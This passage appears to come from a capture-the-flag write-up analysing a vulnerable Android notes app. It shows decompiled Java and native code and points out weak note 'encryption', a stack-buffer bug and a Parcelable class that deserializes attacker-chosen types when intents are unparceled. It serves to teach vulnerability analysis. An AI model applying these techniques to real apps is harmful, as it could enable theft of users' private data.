+</span></span><span style=display:flex><span>            startActivity(<span style=color:#66d9ef>new</span> Intent(getApplicationContext(), NoteEditorActivity.<span style=color:#a6e22e>class</span>).<span style=color:#a6e22e>putExtra</span>(<span style=color:#e6db74>&#34;encrypted&#34;</span>, <span style=color:#66d9ef>false</span>));
+</span></span><span style=display:flex><span>            finish();
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>true</span>;
+</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> (item.<span style=color:#a6e22e>getItemId</span>() <span style=color:#f92672>==</span> R.<span style=color:#a6e22e>id</span>.<span style=color:#a6e22e>add_note_encrypted1</span>) {
+</span></span><span style=display:flex><span>            startActivity(<span style=color:#66d9ef>new</span> Intent(getApplicationContext(), NoteEditorActivity.<span style=color:#a6e22e>class</span>).<span style=color:#a6e22e>putExtra</span>(<span style=color:#e6db74>&#34;encrypted&#34;</span>, <span style=color:#66d9ef>true</span>).<span style=color:#a6e22e>putExtra</span>(<span style=color:#e6db74>&#34;algo&#34;</span>, 1));
+</span></span><span style=display:flex><span>            finish();
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>true</span>;
+</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> (item.<span style=color:#a6e22e>getItemId</span>() <span style=color:#f92672>!=</span> R.<span style=color:#a6e22e>id</span>.<span style=color:#a6e22e>add_note_encrypted2</span>) {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
+</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>            startActivity(<span style=color:#66d9ef>new</span> Intent(getApplicationContext(), NoteEditorActivity.<span style=color:#a6e22e>class</span>).<span style=color:#a6e22e>putExtra</span>(<span style=color:#e6db74>&#34;encrypted&#34;</span>, <span style=color:#66d9ef>true</span>).<span style=color:#a6e22e>putExtra</span>(<span style=color:#e6db74>&#34;algo&#34;</span>, 2));
+</span></span><span style=display:flex><span>            finish();
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>true</span>;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>There are a few interesting things happening here:</p><ul><li><code>System.loadLibrary("ins24");</code> - The application loads a native library</li><li>The notes are saved in <code>getSharedPreferences("com.inso.ins24.mynotes", 0);</code>. This SharedPreference is created with mode <code>0=MODE_PRIVATE</code>. SharedPreferences private to the application are stored in the application&rsquo;s private folder, so the notes will be saved in <code>/data/user/0/com.inso.ins24/shared_prefs/com.inso.ins24.mynotes.xml</code>, which is only accessible to the owning application.</li><li>If the <code>MainActivity</code> is launched with an intent that contains the extra <code>exit</code>, then <code>finish()</code> will be invoked. This method comes from the <code>AppCompatActivity</code> class and will invoke <code>onDestroy()</code> - basically destroying the activity. Note also that the full body method of <code>onCreate</code> will be executed even when the <code>exit</code> extra is passed, because there is no <code>return</code> inside the if case:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>if</span> (getIntent().<span style=color:#a6e22e>hasExtra</span>(<span style=color:#e6db74>&#34;exit&#34;</span>)) {
+</span></span><span style=display:flex><span>    finish();
+</span></span><span style=display:flex><span>    <span style=color:#75715e>//no return here</span>
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span><span style=color:#75715e>//control flow continues!</span>
+</span></span></code></pre></div></li></ul><p>Let&rsquo;s also check the <code>NoteAPIActivity</code> which is also exported:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> com.inso.ins24;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> android.content.SharedPreferences;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> android.os.Bundle;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> androidx.appcompat.app.AppCompatActivity;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.ArrayList;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.HashSet;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.List;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>/* loaded from: classes4.dex */</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>NoteAPIActivity</span> <span style=color:#66d9ef>extends</span> AppCompatActivity {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@Override</span> <span style=color:#75715e>// androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>protected</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>onCreate</span>(Bundle savedInstanceState) {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>super</span>.<span style=color:#a6e22e>onCreate</span>(savedInstanceState);
+</span></span><span style=display:flex><span>        setContentView(R.<span style=color:#a6e22e>layout</span>.<span style=color:#a6e22e>activity_note_apiactivity</span>);
+</span></span><span style=display:flex><span>        SharedPreferences sharedPreferences <span style=color:#f92672>=</span> getSharedPreferences(<span style=color:#e6db74>&#34;com.inso.ins24.mynotes&#34;</span>, 0);
+</span></span><span style=display:flex><span>        List<span style=color:#f92672>&lt;</span>String<span style=color:#f92672>&gt;</span> notes <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ArrayList<span style=color:#f92672>&lt;&gt;</span>();
+</span></span><span style=display:flex><span>        HashSet<span style=color:#f92672>&lt;</span>String<span style=color:#f92672>&gt;</span> noteSet2 <span style=color:#f92672>=</span> (HashSet) sharedPreferences.<span style=color:#a6e22e>getStringSet</span>(<span style=color:#e6db74>&#34;notes&#34;</span>, <span style=color:#66d9ef>null</span>);
+</span></span><span style=display:flex><span>        String new_note <span style=color:#f92672>=</span> getIntent().<span style=color:#a6e22e>getStringExtra</span>(<span style=color:#e6db74>&#34;my_first_note&#34;</span>);
+</span></span><span style=display:flex><span>        System.<span style=color:#a6e22e>loadLibrary</span>(<span style=color:#e6db74>&#34;ins24&#34;</span>);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (noteSet2 <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span>noteSet2.<span style=color:#a6e22e>isEmpty</span>()) {
+</span></span><span style=display:flex><span>            finish();
+</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> (new_note <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span>) {
+</span></span><span style=display:flex><span>            notes.<span style=color:#a6e22e>add</span>(<span style=color:#e6db74>&#34;&#34;</span>);
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>int</span> noteId <span style=color:#f92672>=</span> notes.<span style=color:#a6e22e>size</span>() <span style=color:#f92672>-</span> 1;
+</span></span><span style=display:flex><span>            notes.<span style=color:#a6e22e>set</span>(noteId, new_note);
+</span></span><span style=display:flex><span>            notes.<span style=color:#a6e22e>set</span>(noteId, MainActivity.<span style=color:#a6e22e>encrypt</span>(String.<span style=color:#a6e22e>valueOf</span>(new_note), <span style=color:#66d9ef>new</span> <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span>{65, 76, 71, 49, 0})); <span style=color:#75715e>//ALG1</span>
+</span></span><span style=display:flex><span>            sharedPreferences.<span style=color:#a6e22e>edit</span>().<span style=color:#a6e22e>putStringSet</span>(<span style=color:#e6db74>&#34;notes&#34;</span>, <span style=color:#66d9ef>new</span> HashSet<span style=color:#f92672>&lt;&gt;</span>(notes)).<span style=color:#a6e22e>apply</span>();
+</span></span><span style=display:flex><span>            finish();
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>Nothing interesting here. If no notes have ever been created, and the <code>my_first_note</code> extra string has been passed to the intent, then the provided note will be created and stored with the content specified by the invoking application.</p><p>Finally, let&rsquo;s take a look at what the native library does by loading it into ghidra. Fortunately, the native library (<code>libins24.so</code>) is not stripped:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> <span style=color:#a6e22e>do_vigenere</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>str);
+</span></span><span style=display:flex><span><span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> <span style=color:#a6e22e>rot13</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>s);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>_jstring <span style=color:#f92672>*</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>Java_com_inso_ins24_utils_CryptoConfig_docipher</span>(
+</span></span><span style=display:flex><span>    _JNIEnv <span style=color:#f92672>*</span>env,_jclass <span style=color:#f92672>*</span>clz,_jarray <span style=color:#f92672>*</span>algo,_jstring <span style=color:#f92672>*</span>note
+</span></span><span style=display:flex><span>) {
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> arr_alg_len;
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>algo_str;
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>pcVar1;
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>pcVar2;
+</span></span><span style=display:flex><span>  _jstring <span style=color:#f92672>*</span>ret;
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>note_c_str;
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>  note_c_str <span style=color:#f92672>=</span> (<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)_JNIEnv<span style=color:#f92672>::</span><span style=color:#a6e22e>GetStringUTFChars</span>(env,note,NULL);
+</span></span><span style=display:flex><span>  arr_alg_len <span style=color:#f92672>=</span> _JNIEnv<span style=color:#f92672>::</span><span style=color:#a6e22e>GetArrayLength</span>(env,algo);
+</span></span><span style=display:flex><span>  algo_str <span style=color:#f92672>=</span> <span style=color:#a6e22e>get_algo</span>(env,clz,(_jbyteArray <span style=color:#f92672>*</span>)algo,arr_alg_len);
+</span></span><span style=display:flex><span>  pcVar1 <span style=color:#f92672>=</span> <span style=color:#a6e22e>strstr</span>(algo_str,<span style=color:#e6db74>&#34;ALG1&#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (pcVar1 <span style=color:#f92672>==</span> NULL) {
+</span></span><span style=display:flex><span>    pcVar2 <span style=color:#f92672>=</span> <span style=color:#a6e22e>strstr</span>(algo_str,<span style=color:#e6db74>&#34;ALG2&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (pcVar2 <span style=color:#f92672>!=</span> NULL) {
+</span></span><span style=display:flex><span>      note_c_str <span style=color:#f92672>=</span> <span style=color:#a6e22e>rot13</span>(note_c_str); <span style=color:#75715e>//ALG2
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    }
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>    note_c_str <span style=color:#f92672>=</span> <span style=color:#a6e22e>do_vigenere</span>(note_c_str); <span style=color:#75715e>//ALG1
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  }
+</span></span><span style=display:flex><span>  ret <span style=color:#f92672>=</span> (_jstring <span style=color:#f92672>*</span>)_JNIEnv<span style=color:#f92672>::</span><span style=color:#a6e22e>NewStringUTF</span>(env,note_c_str);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> ret;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> <span style=color:#a6e22e>get_algo</span>(_JNIEnv <span style=color:#f92672>*</span>env,_jclass <span style=color:#f92672>*</span>param_2, _jbyteArray <span style=color:#f92672>*</span>arr, <span style=color:#66d9ef>int</span> arr_len) {
+</span></span><span style=display:flex><span>  byte <span style=color:#f92672>*</span>lVar1;
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>long</span> in_FS_OFFSET;
+</span></span><span style=display:flex><span>  ulong i;
+</span></span><span style=display:flex><span>  byte buf [<span style=color:#ae81ff>56</span>];
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>long</span> canary;
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>  canary <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>(<span style=color:#66d9ef>long</span> <span style=color:#f92672>*</span>)(in_FS_OFFSET <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x28</span>);
+</span></span><span style=display:flex><span>  lVar1 <span style=color:#f92672>=</span> (byte <span style=color:#f92672>*</span>)_JNIEnv<span style=color:#f92672>::</span><span style=color:#a6e22e>GetByteArrayElements</span>(env,arr, NULL);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>for</span> (i<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>; i<span style=color:#f92672>&lt;</span>(ulong)(<span style=color:#66d9ef>long</span>)arr_len; i<span style=color:#f92672>++</span>) {
+</span></span><span style=display:flex><span>    buf[i] <span style=color:#f92672>=</span> lVar1[i];
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#f92672>*</span>(<span style=color:#66d9ef>long</span> <span style=color:#f92672>*</span>)(in_FS_OFFSET <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x28</span>) <span style=color:#f92672>==</span> canary) {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> (<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)buf;
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#75715e>/* WARNING: Subroutine does not return */</span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>__stack_chk_fail</span>();
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>Some minor observations regarding the native layer:</p><ul><li>There is no <code>JNI_OnLoad</code>.</li><li>Only one function is interfacing with the Java layer: <code>Java_com_inso_ins24_utils_CryptoConfig_docipher</code></li><li><code>get_algo</code> returns a stack buffer. Now this is a bug.</li><li><code>get_algo</code> loops <code>arr_len</code> times but the <code>buf</code> has fixed length of 56 bytes. Since <code>"ALG1"</code> and <code>"ALG2"</code> are the only values passed to <code>get_algo</code>, this <em>seems safe for now</em>.</li><li><code>rot13</code> corresponds to <code>ALG1</code> and <code>do_vigenere</code> to <code>ALG2</code>. The Vigenere algorithm also has a static key (<code>KEYINSOKEY</code>) for all notes. So, the &ldquo;encryption&rdquo; is breakable in both cases.</li></ul><p>For the sake of completeness, let&rsquo;s also examine the <code>CryptoConfig</code> class which declares the native function <code>Java_com_inso_ins24_utils_CryptoConfig_docipher</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> com.inso.ins24.utils;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>/* loaded from: classes3.dex */</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>CryptoConfig</span> {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> ALGO;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> String IN;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>native</span> String <span style=color:#a6e22e>docipher</span>(<span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> bArr, String str);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>protected</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>finalize</span>() <span style=color:#66d9ef>throws</span> Throwable {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>super</span>.<span style=color:#a6e22e>finalize</span>();
+</span></span><span style=display:flex><span>        docipher(<span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>ALGO</span>, <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>IN</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>Weird. Why would it invoke <code>docipher</code> in its destructor? The <code>docipher</code> does not save the result in the SharedPreferences. Anyway.</p><h3 id=bug-bug-where-are-you-bug>Bug, bug, where are you bug?</h3><p>At this point we can be staring at our application and never find the bug. The reason is that we have to dig and abuse Android internals a bit.</p><p>One notorious thing with Android Intents, is that they get unparceled quite aggressively. This has been abused <a href=https://www.usenix.org/system/files/conference/woot15/woot15-paper-peles.pdf target=_blank rel="noopener noreferrer">since 2015</a> and also to exploit the <a href=https://blog.oversecured.com/Exploiting-memory-corruption-vulnerabilities-on-Android/ target=_blank rel="noopener noreferrer">PayPal app</a> in 2021.</p><p>Let&rsquo;s check the Android source code ourselves:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#75715e>// https://cs.android.com/android/platform/superproject/main/+/main:frameworks/base/core/java/android/content/Intent.java;l=8932;bpv=0</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Intent</span> <span style=color:#66d9ef>implements</span> Parcelable, Cloneable {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@UnsupportedAppUsage</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> Bundle mExtras;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>boolean</span> <span style=color:#a6e22e>hasExtra</span>(String name) {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> mExtras <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span> <span style=color:#f92672>&amp;&amp;</span> mExtras.<span style=color:#a6e22e>containsKey</span>(name);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#a6e22e>@Nullable</span> String <span style=color:#a6e22e>getStringExtra</span>(String name) {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> mExtras <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span> <span style=color:#f92672>?</span> <span style=color:#66d9ef>null</span> : mExtras.<span style=color:#a6e22e>getString</span>(name);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>BaseBundle</span> {
+</span></span><span style=display:flex><span>    <span style=color:#75715e>// https://cs.android.com/android/platform/superproject/main/+/main:frameworks/base/core/java/android/os/BaseBundle.java;l=697;drc=9e2bc26eb6d703b0b03130bf042222fb8dab08ce;bpv=0</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>boolean</span> <span style=color:#a6e22e>containsKey</span>(String key) {
+</span></span><span style=display:flex><span>        unparcel();                                 <span style=color:#75715e>// &lt;-----------------------</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> mMap.<span style=color:#a6e22e>containsKey</span>(key);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e>// https://cs.android.com/android/platform/superproject/main/+/main:frameworks/base/core/java/android/os/BaseBundle.java;drc=9e2bc26eb6d703b0b03130bf042222fb8dab08ce;bpv=0;l=1414</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> String <span style=color:#a6e22e>getString</span>(<span style=color:#a6e22e>@Nullable</span> String key) {
+</span></span><span style=display:flex><span>        unparcel();                                 <span style=color:#75715e>// &lt;-----------------------</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>final</span> Object o <span style=color:#f92672>=</span> mMap.<span style=color:#a6e22e>get</span>(key);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> (String) o;
+</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>catch</span> (ClassCastException e) {
+</span></span><span style=display:flex><span>            typeWarning(key, o, <span style=color:#e6db74>&#34;String&#34;</span>, e);
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>null</span>;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e>/**
+</span></span></span><span style=display:flex><span><span style=color:#75715e>     * If the underlying data are stored as a Parcel, unparcel them
+</span></span></span><span style=display:flex><span><span style=color:#75715e>     * using the currently assigned class loader.
+</span></span></span><span style=display:flex><span><span style=color:#75715e>     */</span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@UnsupportedAppUsage</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>final</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>unparcel</span>() {
+</span></span><span style=display:flex><span>        unparcel(<span style=color:#75715e>/* itemwise */</span> <span style=color:#66d9ef>false</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#75715e>/** Deserializes the underlying data and each item if {@code itemwise} is true. */</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>final</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>unparcel</span>(<span style=color:#66d9ef>boolean</span> itemwise) {
+</span></span><span style=display:flex><span>        <span style=color:#75715e>//...</span>
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>So, when our target app simply checks the existence of extras in Intents, without actually retrieving the objects, the Intents&rsquo; data will get automatically deserialized (<code>unparceled()</code>). With this in mind, let&rsquo;s examine again the target application for any interesting objects that implement <code>Serializable</code> or <code>Parcelable</code> so that we can pass them from our app to the target app:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> com.inso.ins24.utils;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> android.os.Parcel;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> android.os.Parcelable;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.google.gson.Gson;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.google.gson.GsonBuilder;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>/* loaded from: classes3.dex */</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>JSONBuilder</span> <span style=color:#66d9ef>implements</span> Parcelable {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>final</span> Parcelable.<span style=color:#a6e22e>Creator</span><span style=color:#f92672>&lt;</span>JSONBuilder<span style=color:#f92672>&gt;</span> CREATOR <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Parcelable.<span style=color:#a6e22e>Creator</span><span style=color:#f92672>&lt;</span>JSONBuilder<span style=color:#f92672>&gt;</span>() { <span style=color:#75715e>// from class: com.inso.ins24.utils.JSONBuilder.1</span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e>/* JADX WARN: Can&#39;t rename method to resolve collision */</span>
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>@Override</span> <span style=color:#75715e>// android.os.Parcelable.Creator</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>public</span> JSONBuilder<span style=color:#f92672>[]</span> <span style=color:#a6e22e>newArray</span>(<span style=color:#66d9ef>int</span> i) {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>new</span> JSONBuilder<span style=color:#f92672>[</span>i<span style=color:#f92672>]</span>;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e>/* JADX WARN: Can&#39;t rename method to resolve collision */</span>
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>@Override</span> <span style=color:#75715e>// android.os.Parcelable.Creator</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>public</span> JSONBuilder <span style=color:#a6e22e>createFromParcel</span>(Parcel parcel) {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>new</span> JSONBuilder(parcel);
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>    };
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>final</span> Gson JSON <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> GsonBuilder().<span style=color:#a6e22e>create</span>();
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> Object data;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#a6e22e>JSONBuilder</span>(Parcel parcel) {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> {
+</span></span><span style=display:flex><span>            <span style=color:#75715e>/*
+</span></span></span><span style=display:flex><span><span style=color:#75715e>            Returns the Class object associated with the class or interface with the given string name
+</span></span></span><span style=display:flex><span><span style=color:#75715e>            public static Class&lt;?&gt; forName(String className);
+</span></span></span><span style=display:flex><span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>            This method deserializes the specified Json into an object of the specified class.
+</span></span></span><span style=display:flex><span><span style=color:#75715e>            public &lt;T&gt; T fromJson(java.lang.String json, java.lang.Class&lt;T&gt; classOfT);
+</span></span></span><span style=display:flex><span><span style=color:#75715e>            */</span>
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>data</span> <span style=color:#f92672>=</span> JSON.<span style=color:#a6e22e>fromJson</span>(parcel.<span style=color:#a6e22e>readString</span>(), (Class<span style=color:#f92672>&lt;</span>Object<span style=color:#f92672>&gt;</span>) Class.<span style=color:#a6e22e>forName</span>(parcel.<span style=color:#a6e22e>readString</span>()));
+</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>catch</span> (ClassNotFoundException e) {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> RuntimeException(e);
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@Override</span> <span style=color:#75715e>// android.os.Parcelable</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>int</span> <span style=color:#a6e22e>describeContents</span>() {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> 0;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@Override</span> <span style=color:#75715e>// android.os.Parcelable</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>writeToParcel</span>(Parcel parcel, <span style=color:#66d9ef>int</span> i) {
+</span></span><span style=display:flex><span>        parcel.<span style=color:#a6e22e>writeString</span>(<span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>data</span>.<span style=color:#a6e22e>getClass</span>().<span style=color:#a6e22e>getCanonicalName</span>());
+</span></span><span style=display:flex><span>        parcel.<span style=color:#a6e22e>writeString</span>(JSON.<span style=color:#a6e22e>toJson</span>(<span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>data</span>));
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
